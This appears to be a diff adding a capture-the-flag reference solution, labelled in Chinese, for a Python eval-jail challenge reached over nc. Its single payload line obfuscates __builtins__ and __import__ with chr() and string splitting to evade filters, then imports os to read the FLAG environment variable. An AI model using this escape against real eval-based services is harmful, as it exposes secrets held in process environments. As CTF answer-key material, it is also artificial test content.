@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+getattr(globals()[chr(95)*2+'builtins'+chr(95)*2], chr(95)*2+'imp'+'ort'+chr(95)*2)('os').environ['FLAG']
